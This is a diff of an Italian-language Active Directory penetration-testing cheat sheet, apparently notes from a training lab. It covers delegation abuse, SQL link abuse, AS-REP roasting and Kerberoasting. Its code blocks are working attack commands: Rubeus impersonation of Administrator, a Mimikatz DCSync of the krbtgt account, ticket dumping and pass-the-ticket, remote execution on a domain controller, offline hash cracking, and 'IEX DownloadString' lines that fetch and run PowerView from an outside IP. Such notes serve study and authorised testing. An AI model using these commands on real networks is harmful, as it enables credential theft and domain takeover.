@@ -581,14 +581,13 @@ Get-RemoteCachedCredential -Computername <computername> -Verbose (Retrieve domai
 
 # Domain-privilege-escalation
 
-## Contrained Delegation [Local Admin on machine]
-### 1) Un utente, Joe, si autentica al servizio web (in esecuzione con l'account servizio studvm ) utilizzando un meccanismo di autenticazione non compatibile con Kerberos.
-### 2) Il servizio web richiede un ticket al Key Distribution Center (KDC) per l'account di Joe.
-### 3) Il KDC controlla il valore userAccountControl di studvm per l'attributo TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION e che l'account di Joe non sia bloccato per la delega. In caso di esito positivo, viene restituito un ticket inoltrabile per l'account di Joe (S4U2Self).
-### 4) Il servizio passa quindi questo ticket al KDC e richiede un ticket di servizio per il servizio CIFS/mgmtsrv.TECH.FINANCE.CORP .
-### 5) Il KDC controlla il campo msDS AllowedToDelegateTo dell'account websvc. Se il servizio è presente nell'elenco, restituirà un ticket di servizio per mgmtsrv (S4U2Proxy).
-### 6) Il servizio Web può ora autenticarsi al CIFS su mgmtsrv come Joe utilizzando il TGS fornito.
-## Prerequisiti: Richiesto local Admin on machine and Hash machine di partenza. Per abusare della delega vincolata nello scenario sopra descritto, è necessario avere accesso all'account studvm. Se si ha accesso a tale account, è possibile accedere ai servizi elencati in msDS AllowedToDelegateTo dell'account websvc come QUALSIASI utente.
+## Contrained Delegation [Local Admin sulla macchina con la delegazione attiva]
+### 1) L'utente esegue l'autenticazione al controller di dominio (DC) utilizzando il nome utente e la password. Il KDC verifica le credenziali dell'utente ed emette un Ticket Granting Ticket (TGT) per l'utente.
+### 2) Utilizzando il TGT ottenuto, l'utente richiede un ticket di servizio per il servizio web; il KDC verifica l'autenticità del TGT e, se tutto va bene, concede il ticket di servizio al servizio web.
+### 3) Il servizio web, agendo ora per conto dell'utente, avvia una nuova richiesta al servizio SQL, presentando al servizio SQL il ticket TGS ricevuto.
+### 4) Il servizio SQL inoltra il ticket TGS al KDC per la verifica, quindi concede il ticket di servizio per il servizio SQL al servizio web.
+### 5) Il servizio Web presenta il ticket di servizio al servizio SQL, che verifica l'autenticità del ticket con il KDC e quindi concede l'accesso alle risorse richieste.
+## Prerequisiti: 1) Un account utente o computer con l'opzione di delega abilitata: "Considera attendibile questo utente/computer solo per la delega ai servizi specificati" . 2) Privilegi di amministratore locale sull'host compromesso delegato. Se hai compromesso il server come utente normale, dovresti passare all'amministratore per abusare di questa funzione di delega.
 
 ```
 Get-DomainUser -TrustedToAuth
@@ -597,16 +596,22 @@ Get-DomainComputer -TrustedToAuth
 
 powershell -ep bypass
 
-kekeo@ tgt::ask /user:studvm /domain:TECH.FINANCE.CORP /rc4:[HASH account servizio studvm] [step 2 e 3]
+kekeo@ tgt::ask /user:studvm /domain:TECH.FINANCE.CORP /rc4:[HASH account servizio studvm] [step 2 e 3] o rubeus.exe asktgt /user:userName /domain: DomainName /ntlm:Hash /outfile:FileName.tgt
 
-.\Rubeus.exe s4u /user:studvm /rc4:[HASH account servizio studvm] /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.TECH.FINANCE.CORP /altservice:HOST /ptt [alservice= può essere fornito per sostituire uno o più nomi di servizio nel file .kirbi risultante]
+.\Rubeus.exe s4u /user:studvm /rc4:[HASH account servizio studvm] /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.TECH.FINANCE.CORP /altservice:LDAP /ptt [alservice= può essere fornito per sostituire uno o più nomi di servizio nel file .kirbi risultante]
 
 klist
+
+Invoke-Mimikatz -Command '"lsadump:dcsync /user:dcorp\krbtgt"'
 ```	
 
 ## Uncontrained Delegation [Local Admin on machine]
-### Si tratta di una funzione che un amministratore di dominio può impostare su qualsiasi computer all'interno del dominio. In questo modo, ogni volta che un utente accede al computer, una copia del TGT di quell'utente verrà inviata all'interno del TGS fornito dal DC e salvata in memoria in LSASS. Quindi, se si dispone di privilegi di amministratore sul computer, sarà possibile scaricare i biglietti e impersonare gli utenti su qualsiasi computer.
-### Quindi, se un Domain Admins accede a un computer con la funzione "Unconstrained Delegation" attivata e si dispone di privilegi di amministratore locale all'interno di quel computer, sarà possibile eseguire il dump del ticket e impersonare l'amministratore di dominio ovunque (privesc di dominio).
+### 1) Un utente si autentica al KDC (Kerberos Domain Controller) inviando una richiesta crittografata con le proprie credenziali. Il KDC verifica la loro identità e invia all'utente un ticket TGT .
+### 2) L' utente riceve il ticket TGT e lo rispedisce al KDC, richiedendo un ticket di servizio per un servizio specifico, diciamo un servizio web. Il KDC controlla la validità del TGT e restituisce il ticket di servizio (TGS) per il servizio richiesto.
+### 3) A questo punto l'utente può utilizzare il ticket di servizio (TGS) per accedere al servizio web richiesto. Tuttavia, se il servizio richiesto come il servizio Web nel nostro esempio deve accedere a un altro servizio come SQL , l'utente deve ottenere un ticket TGT inoltrabile per passarlo al servizio Web insieme al ticket TGS. Quindi un TGS per il servizio web + tgt per servizio SQL  vengono inviati al servizio web.
+### 4) Il server Web memorizza localmente nella cache il TGT inoltrabile dell'utente e lo utilizza per richiedere un ticket TGS dal KDC per accedere al servizio SQL per conto dell'utente.
+### 5) Il KDC verifica il TGT presentato e fornisce al server Web il TGS SQL per accedere al server SQL come utente.
+### 6) Il server web lo inoltra aò server sql che poi in cambio riceve le risorse richieste.
 ## Prerequisiti: L'account ha il flag TRUSTED_FOR_DELEGATION nei flag Controllo account utente (UAC). L'account utente non ha il flag NOT_DELEGATED impostato (per impostazione predefinita gli account non di dominio hanno questo flag).
 
 ```	
@@ -619,6 +624,8 @@ Import-Module Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command '"sekurlsa::tickets"' (controlla se c'è un tickets DA disponibile)
 
 Invoke-Mimikatz -Command '"kerberos:ptt [ticket.kirbi]'"
+
+Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc (RCE su Domain Controller)
 ```
 
 ## Abuse SQL [Local Admin on machine]
@@ -637,14 +644,15 @@ Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec maste
 ```	
 
 ## Kerberoasting - AS-REPs [Normal User on the machine]
-### Se nelle impostazioni UserAccountControl di un utente è abilitata la funzione "Non richiedere la preautenticazione Kerberos", ossia la preautenticazione Kerberos è disabilitata, è possibile ottenere l'AS REP decifrabile dell'utente e forzarlo offline.
+### Se nelle impostazioni UserAccountControl di un utente è abilitata la funzione "Non richiedere la preautenticazione Kerberos", ossia la preautenticazione Kerberos è disabilitata, è possibile ottenere l'AS REP decifrabile dell'utente e forzarlo offline. In pratica richiedi un Ticket Granting Ticket (TGT). Il KDC risponderà con il TGT per l'account, senza richiedere la password dell'account come pre-autenticazione.
 
 ```
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -Verbose" 
 
+o
 Invoke-ASREPRoast -Verbose (enumerazione di tutti gli utenti cpn Kerberos pre auth disabilitato)
 
-Get-ASREPHash -Username student1 -Verbose (prendere hash)
+Get-ASREPHash -Username student1 -Verbose (prendere hash) 
 
 ./john hash.txt --wordlist=wordlist.txt
 
@@ -683,6 +691,8 @@ Get-NetUser -SPN (find user accounts usati come service account)
 Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN(MSSQLvc/dcorp.mgmt.dollarcorp.moneycorp.local)" (Request TGS)
 o
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Request-SPNTicket" (Request TGS)
+o
+GetUserSPNs -dc-ip [IP] domain/hostname -request (impacket) poi usi hashcat (13200)
 
 klist
 
